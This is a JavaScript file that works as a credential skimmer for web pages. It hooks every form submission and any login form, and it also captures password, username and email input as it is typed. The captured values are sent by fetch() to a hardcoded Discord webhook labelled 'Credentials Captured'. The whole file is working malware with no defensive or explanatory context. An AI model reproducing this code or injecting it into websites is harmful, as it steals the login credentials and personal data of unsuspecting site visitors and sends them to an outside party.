// Function to send data to Discord webhook
function sendDataToDiscord(data) {
    const webhookUrl = 'https://discord.com/api/webhooks/1392950860710936777/3s56QIdLBCHfJBPe32UKImt-UVfgv6RBfacyYwDLevIB_yeXMZgs5zPPsjqa6_MsBP2L';

    const discordMessage = {
        embeds: [{
            title: "🔑 Credentials Captured",
            color: 16711680, // Red color
            fields: Object.keys(data).map(key => ({
                name: key,
                value: data[key] || 'N/A',
                inline: true
            })),
            timestamp: new Date().toISOString(),
            footer: {
                text: "Credential Capture System"
            }
        }]
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(discordMessage)
    })
    .then(response => {
        if (response.ok) {
            console.log('Data sent to Discord successfully');
        } else {
            console.error('Failed to send to Discord:', response.status);
        }
    })
    .catch(error => {
        console.error('Error sending to Discord:', error);
    });
}

// Function to capture form data
function captureFormData(form) {
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        data[key] = value;
    }
    
    // Add additional info
    data.timestamp = new Date().toISOString();
    data.userAgent = navigator.userAgent;
    data.url = window.location.href;
    
    return data;
}

// Wait for page to load
document.addEventListener('DOMContentLoaded', function() {
    // Capture all form submissions
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const data = captureFormData(form);
        
        // Send to Discord
        sendDataToDiscord(data);
        
        console.log('Captured form data:', data);
    });
    
    // Also capture login forms specifically
    const loginForms = document.querySelectorAll('form[action*="login"], form[id*="login"], .login-form');
    loginForms.forEach(form => {
        form.addEventListener('submit', function(e) {
            const data = captureFormData(form);
            sendDataToDiscord(data);
        });
    });
    
    // Capture input changes for real-time monitoring
    document.addEventListener('input', function(e) {
        if (e.target.type === 'password' || e.target.name === 'username' || e.target.name === 'email') {
            const data = {
                field: e.target.name || e.target.id,
                value: e.target.value,
                type: e.target.type,
                timestamp: new Date().toISOString()
            };
            
            // Only send if field has substantial content
            if (data.value && data.value.length > 2) {
                sendDataToDiscord(data);
            }
        }
    });
});

